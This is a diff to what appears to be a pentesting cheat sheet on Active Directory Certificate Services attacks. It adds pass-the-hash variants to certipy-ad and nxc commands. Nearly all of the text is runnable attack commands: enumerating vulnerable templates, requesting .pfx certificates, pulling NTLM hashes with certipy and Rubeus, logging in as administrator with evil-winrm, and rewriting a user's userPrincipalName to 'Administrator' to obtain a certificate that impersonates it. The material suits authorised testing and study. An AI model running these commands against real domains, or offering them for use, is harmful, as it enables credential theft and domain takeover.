@@ -11,14 +11,26 @@ tags: ["Kerberos", "Pass-The-Ticket", "Certify", "Credential Dumping", "LDAP", "
 {{< tabcontent set1 tab1 >}}
 
 ```console
+# Password
 certipy-ad find -u '<USER>' -p '<PASSWORD>' -target <TARGET> -text -stdout -vulnerable
+```
+
+```console
+# NTLM
+certipy-ad find -u '<USER>' -hashes '<HASH>' -target <TARGET> -text -stdout -vulnerable
 ```
 
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
 ```console
+# Password
 nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M adcs
+```
+
+```console
+# NTLM
+nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -M adcs
 ```
 
 {{< /tabcontent >}}
@@ -77,13 +89,13 @@ get-adcstemplate | fl displayname
 
 ---
 
-### Request a Certificate of Current User
+### Request a Personal Information Exchange File (.pfx)
 
 {{< tab set3 tab1 >}}Linux{{< /tab >}}
 {{< tab set3 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-#### 1. Request a Certificate
+#### 1. Request a pfx
 
 ```console
 certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca <CA> -template User -target <DC> -pfx '<USER>.pfx'
@@ -101,7 +113,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'oorend.pfx'
 ```
 
-#### 2. Get NTLM Hash
+#### 2. Get NTLM Hash with pfx
 
 ```console
 sudo ntpdate -s <DC> && certipy-ad auth -pfx '<USER>.pfx'
@@ -123,7 +135,7 @@ sudo ntpdate -s <DC> && certipy-ad auth -pfx '<USER>.pfx'
 openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx
 ```
 
-#### 3. Get NTLM Hash
+#### 3. Get NTLM Hash with pfx
 
 ```console
 .\rubeus.exe asktgt /user:'<USER>' /certificate:cert.pfx /getcredentials /show /nowrap
@@ -413,18 +425,36 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 #### 1. Modify Target User's userPrincipalName (With GenericAll/GenericWrite)
 
 ```console
+# Password
+certipy-ad account update -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -user <TARGET_USER> -upn Administrator
+```
+
+```console
+# NTLM
 certipy-ad account update -username '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn Administrator
 ```
 
 #### 2. Request a Cert of Targer User
 
 ```console
+# Password
 certipy-ad req -username '<TARGET_USER>@<DOMAIN>' -password '<PASSWORD>' -ca <CA> -template <VULN_TEMPLATE>
+```
+
+```console
+# NTLM
+certipy-ad req -username '<TARGET_USER>@<DOMAIN>' -hashes <HASH> -ca <CA> -template <VULN_TEMPLATE>
 ```
 
 #### 3. Change Back Target User's userPrincipalName
 
 ```console
+# Password
+certipy-ad account update -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -user <TARGET_USER> -upn '<TARGET_USER>@<DOMAIN>'
+```
+
+```console
+# NTLM
 certipy-ad account update -username '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn '<TARGET_USER>@<DOMAIN>'
 ```
 
